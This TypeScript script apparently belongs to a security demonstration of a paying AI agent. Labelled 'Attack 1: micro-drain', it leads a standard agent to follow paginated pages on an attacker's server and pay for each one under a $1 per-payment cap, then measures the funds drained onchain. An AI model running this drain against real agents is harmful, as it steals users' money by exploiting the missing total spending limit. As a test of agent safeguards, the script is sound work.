import { ATTACK_URL, loadSigner } from "../config.js";
import { createStandardAgent, explorerTx } from "../standard-client.js";
import { usdcBalance } from "../usdc.js";

// The agent keeps following "nextPage", as an agent doing research would.
// Every payment is under the $1 cap, so the standard client pays each one.
const PAGES = Number(process.argv[2] ?? 3);

async function main(): Promise<void> {
  const agent = await createStandardAgent();
  const attacker = await loadSigner("attacker");
  const before = await usdcBalance(attacker.address);

  console.log(`Attack 1: micro-drain. Agent ${agent.address} will read ${PAGES} pages.\n`);

  let served = 0;
  for (let page = 1; page <= PAGES; page += 1) {
    const result = await agent.pay(`${ATTACK_URL}/report?page=${page}`);
    if (result.settled) {
      served += 1;
      console.log(`Page ${page}: served after payment  ${explorerTx(result.transaction ?? "")}`);
    } else {
      console.log(`Page ${page}: not served (status ${result.status}) ${result.error ?? ""}`.trim());
    }
  }

  // Wait briefly so the last transfer is visible, then measure what actually moved onchain.
  await new Promise((resolve) => setTimeout(resolve, 5000));
  const after = await usdcBalance(attacker.address);
  const drained = after - before;

  console.log(`\nPages served: ${served} of ${PAGES}`);
  console.log(`Drained onchain: $${drained.toFixed(2)} (attacker balance ${before.toFixed(2)} -> ${after.toFixed(2)})`);
  if (drained > served * 0.99 + 0.001) {
    console.log("Some payments settled without the page being served.");
  }
  console.log("Each payment passed the $1 per-payment cap. Nothing limits the total.");
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
